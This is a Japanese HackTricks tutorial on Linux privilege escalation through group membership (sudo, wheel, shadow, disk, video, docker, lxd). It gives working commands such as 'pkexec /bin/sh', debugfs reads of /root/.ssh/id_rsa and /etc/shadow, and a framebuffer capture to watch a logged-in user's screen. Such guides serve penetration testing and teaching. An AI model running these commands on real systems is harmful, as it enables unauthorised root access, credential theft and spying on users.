<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>


# Sudo/Adminグループ

## **PE - 方法 1**

**時々**、**デフォルトで\(またはあるソフトウェアが必要とするために\)** **/etc/sudoers** ファイル内に以下のような行が見つかることがあります：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudo グループまたは admin グループに属する任意のユーザーが、sudo として何でも実行できる**ことを意味します。

この場合、**root になるには、次のコマンドを実行するだけです**：
```text
sudo su
```
## PE - 方法 2

すべてのsuidバイナリを見つけ、**Pkexec**バイナリがあるか確認します：
```bash
find / -perm -4000 2>/dev/null
```
```markdown
もしバイナリpkexecがSUIDバイナリであり、あなたがsudoまたはadminグループに属している場合、pkexecを使用してsudoとしてバイナリを実行できる可能性があります。
以下の内容を確認してください:
```
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
```markdown
以下に、どのグループが**pkexec**を実行できるか、また**デフォルトでは**一部のLinuxでは**sudoまたはadmin**グループが**表示される**ことがあります。

**rootになるには以下を実行します**:
```
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
実行しようとしたときに**pkexec**がこの**エラー**を出した場合：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないからではなく、GUIなしで接続していないからです**。この問題に対する回避策はこちらにあります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
```
{% endcode %}

{% code title="session2" %}
```
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**時々**、**デフォルトで** **/etc/sudoers** ファイル内にこの行が見つかることがあります：
```text
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheel グループに属する任意のユーザーが sudo として何でも実行できる**ことを意味します。

この場合、**root になるためには次のコマンドを実行するだけです**：
```text
sudo su
```
# Shadow グループ

**group shadow** に属するユーザーは **/etc/shadow** ファイルを**読む**ことができます：
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
ファイルを読んで、**ハッシュをクラック**してみてください。

# Disk Group

この権限は、マシン内のすべてのデータにアクセスできるため、ほぼ**rootアクセスと同等です**。

ファイル：`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
```markdown
debugfsを使用すると、**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、以下のようにします:
```
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
```
しかし、**rootが所有するファイルに書き込もうとする** \(例えば `/etc/shadow` や `/etc/passwd`\) と "**Permission denied**" エラーが表示されます。

# Video Group

`w` コマンドを使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます:
```
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンの端末にログインしていることを意味します。

**videoグループ**は画面出力を見る権限があります。基本的には画面を観察することができます。それを行うには、画面上の現在の画像を生データで**取得し**、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**raw画像**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：

![](../../.gitbook/assets/image%20%28208%29.png)

次に、画面で使用されている幅と高さを変更し、異なる画像タイプを確認します（画面をより良く表示するものを選択します）：

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Group

デフォルトでは、**rootグループのメンバー**は、**サービス**の設定ファイルやいくつかの**ライブラリ**ファイル、または**他の興味深いもの**を**変更**できる可能性があるようです。これらは権限の昇格に使用できるかもしれません...

**rootメンバーが変更できるファイルを確認してください**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker グループ

ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。そのため、インスタンスが起動するとすぐにそのボリュームに `chroot` をロードします。これにより、実質的にマシンの root 権限を得ることができます。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd グループ

[lxc - 権限昇格](lxd-privilege-escalation.md)



<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを **共有する**。

</details>
